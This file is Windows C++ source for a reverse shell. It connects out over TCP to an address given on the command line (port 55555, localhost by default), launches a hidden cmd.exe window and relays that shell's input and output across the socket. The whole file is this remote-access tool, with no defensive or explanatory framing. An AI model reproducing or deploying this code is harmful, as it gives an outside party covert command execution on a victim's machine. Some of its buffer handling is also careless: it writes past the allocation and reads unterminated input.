// Remote.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <WinSock2.h>
#include <cassert>
#include <string>
#include <WS2tcpip.h>
#include <string>

#pragma comment(lib, "ws2_32")

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR cmdline, int) {
	const char* address = cmdline && *cmdline != 0 ? cmdline : "127.0.0.1";

	WSADATA ws;
	auto error = WSAStartup(MAKEWORD(2, 2), &ws);
	assert(error == 0);

	auto hSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	assert(hSocket != INVALID_SOCKET);

	sockaddr_in addr{};
	addr.sin_family = AF_INET;
	addr.sin_port = htons(55555);
	inet_pton(AF_INET, address, &addr.sin_addr);

	error = connect(hSocket, (sockaddr*)&addr, sizeof(addr));
	assert(error == 0);

	SECURITY_ATTRIBUTES sa{ sizeof(sa) };
	sa.bInheritHandle = TRUE;
	HANDLE hLocalRead, hCmdWrite;
	CreatePipe(&hLocalRead, &hCmdWrite, &sa, 0);

	HANDLE hCmdRead, hLocalWrite;
	CreatePipe(&hCmdRead, &hLocalWrite, &sa, 0);

	PROCESS_INFORMATION pi;
	STARTUPINFO si{ sizeof(si) };
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdError = si.hStdOutput = hCmdWrite;
	si.hStdInput = hCmdRead;

	WCHAR name[] = L"cmd.exe /Q";

	auto created = CreateProcess(nullptr, name, nullptr, nullptr, TRUE,
		CREATE_NO_WINDOW, nullptr, L"c:\\", &si, &pi);
	if (created) {
		printf("Cmd created: PID: %u\n", pi.dwProcessId);

		DWORD size = 1 << 16;
		auto buffer = (char*)VirtualAlloc(nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

		for (;;) {
			std::string result;
			DWORD bytes;
			while (PeekNamedPipe(hLocalRead, nullptr, 0, nullptr, &bytes, nullptr) && bytes > 0) {
				ReadFile(hLocalRead, buffer, size, &bytes, nullptr);
				buffer[bytes] = 0;
				result += buffer;
				Sleep(10);
			}
			if (result.empty())
				continue;

			if (result.back() != '>')
				continue;

			send(hSocket, result.c_str(), (int)result.length(), 0);

			char input[256];
			int received = recv(hSocket, input, sizeof(input), 0);
			if (received <= 0)
				break;

			WriteFile(hLocalWrite, input, (DWORD)strlen(input), &bytes, nullptr);
			Sleep(100);
		}
	}
}
